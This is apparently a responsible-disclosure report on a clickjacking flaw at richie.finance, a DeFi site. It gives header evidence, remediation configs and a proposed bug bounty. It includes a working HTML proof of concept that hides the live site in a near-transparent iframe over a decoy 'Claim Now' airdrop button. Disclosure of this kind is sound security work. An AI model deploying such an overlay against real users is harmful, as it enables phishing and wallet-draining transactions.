Security Disclosures & Bug Bounty Program
Executive Summary

This document serves as a formal responsible disclosure of a front-end security vulnerability (Clickjacking) identified on https://richie.finance/, alongside a formal request for the establishment of a public bug bounty program to incentivize future security research and protect user funds.
1. Responsible Disclosure: Clickjacking Vulnerability

Status: Open — Reported privately to the Richie Finance team
Severity: Medium (High in the context of DeFi wallet interactions)
Affected Asset: https://richie.finance/
Summary

The Richie Finance web application is currently vulnerable to Clickjacking due to missing frame-busting HTTP headers. An attacker can embed the Richie Finance UI within an invisible <iframe> on a malicious website, tricking users into clicking sensitive interface elements (e.g., "Connect Wallet," "Approve," or "Confirm Transaction") without their knowledge.
Proof of Concept (PoC)

    Header Verification: The server response lacks both X-Frame-Options and Content-Security-Policy: frame-ancestors directives. Running curl -I https://richie.finance/ returns the following:
    http

    HTTP/1.1 200 OK
    Server: Vercel
    Strict-Transport-Security: max-age=63072000
    Access-Control-Allow-Origin: *
    (Missing: X-Frame-Options)
    (Missing: Content-Security-Policy: frame-ancestors)

    Visual PoC: A standalone HTML file embeds https://richie.finance/ in an iframe with opacity: 0.0001, positioned exactly over a decoy "Claim Airdrop" button. Any click on the decoy button is intercepted by the hidden Richie Finance interface.
    html

    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { text-align: center; padding: 50px; background: #111; color: #fff; }
            .decoy { padding: 20px 40px; font-size: 24px; background: #00ff00; cursor: pointer; }
            iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 9999; }
        </style>
    </head>
    <body>
        <h1>🎉 Claim Your Free RICH Tokens 🎉</h1>
        <button class="decoy">CLAIM NOW</button>
        <iframe src="https://richie.finance/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
    </body>
    </html>

Impact

A malicious actor can deploy a phishing site with the hidden iframe and trick a user into signing a transaction that drains their wallet. Because the user sees the legitimate Richie Finance UI behind the decoy, they believe they are interacting with the real protocol.
Remediation

Add the following headers to the Next.js configuration (next.config.js) or Vercel deployment configuration (vercel.json):

Next.js (next.config.js):
javascript

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
          { key: 'Content-Security-Policy', value: "frame-ancestors 'self';" },
        ],
      },
    ]
  },
}

Vercel (vercel.json):
json

{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "SAMEORIGIN" },
        { "key": "Content-Security-Policy", "value": "frame-ancestors 'self';" }
      ]
    }
  ]
}

Once these headers are deployed, the iframe will refuse to render, and the clickjacking vector is eliminated.
2. Request: Public Bug Bounty Program

To incentivize continued security research and protect the protocol's users, Richie Finance should establish a public bug bounty program with clear scope, severity tiers, and payout ranges.
Suggested Structure
Severity	Example	Suggested Bounty
Critical	Smart contract drain, unlimited minting	$10,000 – $50,000+
High	Access control bypass, oracle manipulation	$5,000 – $10,000
Medium	Clickjacking, UI-based phishing vectors	$1,000 – $2,500
Low	Information disclosure, missing headers (non-exploitable)	$100 – $500
Suggested Platform

    Immunefi is the industry standard for DeFi bug bounties, with transparent payout structures and a large researcher community.

    Alternatively, a self-hosted program with a dedicated security@richie.finance email and a PGP key for encrypted reports.

Why This Matters

The Clickjacking finding demonstrates that the front-end attack surface is real and exploitable. A public bounty program ensures that future findings are reported responsibly rather than exploited maliciously, and it signals to users that the team takes security seriously. By formalizing this process, Richie Finance can build lasting trust within the PulseChain ecosystem.
